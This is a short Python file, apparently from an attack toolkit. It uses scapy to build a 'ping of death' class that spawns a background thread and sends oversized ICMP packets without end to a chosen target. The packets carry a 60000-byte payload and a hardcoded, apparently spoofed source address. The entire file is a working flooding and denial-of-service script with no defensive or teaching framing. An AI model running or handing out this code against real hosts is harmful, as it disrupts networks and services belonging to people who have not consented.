from scapy.all import IP, ICMP, sr, send
from threading import *


class PingDeath():
    def __init__(self, ip_dst, iface):
        self.stop_event = Event()
        self.ip_dst = ip_dst
        self.iface = iface

        thread_run_ping_death = Thread(target=self.run_ping_of_death)
        thread_run_ping_death.setDaemon(True)
        thread_run_ping_death.start()


    def run_ping_of_death(self):
        packet = IP(src="192.168.13.96", dst=self.ip_dst)
        packet /= ICMP()
        packet /= ("a" * 60000)
        
        while not self.stop_event.is_set():
            send(packet, iface=self.iface, count=5, verbose=0)

    def stop_deauth(self):
        self.stop_event.set()